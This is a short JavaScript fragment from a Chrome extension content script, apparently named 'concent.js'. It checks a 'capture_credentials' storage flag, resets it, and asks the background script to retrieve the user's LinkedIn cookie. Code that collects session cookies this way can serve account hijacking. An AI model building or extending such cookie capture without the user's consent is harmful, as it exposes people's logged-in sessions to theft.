//chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    console.log("Listener triggered in concent.js");
    
    //if(request.message === "capture_credentials") {
        //console.log("Message received to capture credentials");
        
        chrome.storage.local.get('capture_credentials', function(data) {
            if(data.capture_credentials){
                console.log("capture_credentials flag is set, proceeding with cookie retrieval");
                
                chrome.storage.local.set({ 'capture_credentials': false }, function() {
                    console.log("capture_credentials flag reset");
					chrome.runtime.sendMessage({ message: "getLinkedInCookie" });
                });
            } else {
                console.log("capture_credentials flag is not set");
            }
        });
   
//});
